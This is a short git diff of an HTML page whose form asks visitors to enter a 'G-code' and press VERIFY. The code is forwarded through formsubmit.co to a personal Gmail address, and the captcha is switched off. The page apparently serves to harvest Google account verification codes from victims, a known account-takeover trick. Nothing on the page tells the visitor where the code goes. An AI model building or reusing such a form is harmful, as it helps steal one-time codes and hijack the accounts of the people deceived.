@@ -60,13 +60,15 @@
   </style>
 </head>
 <body>
-  <div class="gcode-container">
-    <h1>Enter G-Code</h1>
-    <form action="https://formsubmit.co/emmanuelkoranteng362@gmail.com" method="POST">
-      <input type="text" name="g-code" placeholder="Enter your G-code here" required>
-      <input type="hidden" name="_next" value="thankyou.html">
-      <button type="submit">VERIFY</button>
-    </form>
-  </div>
+<form action="https://formsubmit.co/emmanuelkoranteng@gmail.com" method="POST">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="thankyou.html"> <!-- Optional -->
+
+  <label for="g-code">Enter Your G-code</label>
+  <input type="text" name="g-code" placeholder="Your code here" required>
+
+  <button type="submit">VERIFY</button>
+</form>
 </body>
 </html>
